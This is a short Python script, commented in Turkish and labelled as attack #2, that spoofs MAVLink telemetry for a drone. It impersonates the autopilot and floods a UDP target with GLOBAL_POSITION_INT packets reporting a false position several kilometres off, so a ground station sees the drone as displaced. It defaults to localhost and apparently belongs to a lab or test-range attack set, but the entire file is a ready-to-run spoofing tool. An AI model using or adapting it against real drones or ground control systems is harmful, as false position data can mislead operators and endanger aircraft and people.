#!/usr/bin/env python3
"""Saldiri #2 - GPS / telemetri sahteciligi. Sahte konumla dronu kaymis gosterir."""
import argparse
import socket
import time

from pymavlink.dialects.v20 import common as mavlink2

SPOOF_SYSID = 1
SPOOF_COMPID = mavlink2.MAV_COMP_ID_AUTOPILOT1
BASE_LAT = 39.925018
BASE_LON = 32.836956


class UDPSender:
    def __init__(self, host, port, sysid, compid):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", 0))
        self.addr = (host, int(port))
        self.mav = mavlink2.MAVLink(self, srcSystem=sysid, srcComponent=compid)

    def write(self, data):
        self.sock.sendto(data, self.addr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14560")
    ap.add_argument("--offset-km", type=float, default=2.0)
    ap.add_argument("--rate", type=float, default=20.0)
    ap.add_argument("--duration", type=float, default=10.0)
    args = ap.parse_args()

    host, port = args.target.split(":")
    s = UDPSender(host, port, SPOOF_SYSID, SPOOF_COMPID)
    fake_lat = BASE_LAT + (args.offset_km * 1000.0) / 111320.0
    fake_lon = BASE_LON

    print(f"[saldiri] GPS spoof -> {args.target} | sahte konum "
          f"{fake_lat:.5f},{fake_lon:.5f} ({args.offset_km} km kayma), "
          f"{args.rate} Hz, {args.duration}s")
    period = 1.0 / args.rate
    t0 = time.time()
    n = 0
    while time.time() - t0 < args.duration:
        boot = int((time.time() - t0) * 1000)
        s.mav.global_position_int_send(
            boot,
            int(fake_lat * 1e7), int(fake_lon * 1e7),
            50000, 50000,
            0, 0, 0,
            9000,
        )
        n += 1
        time.sleep(period)
    print(f"[saldiri] tamam. {n} sahte paket gonderildi.")


if __name__ == "__main__":
    main()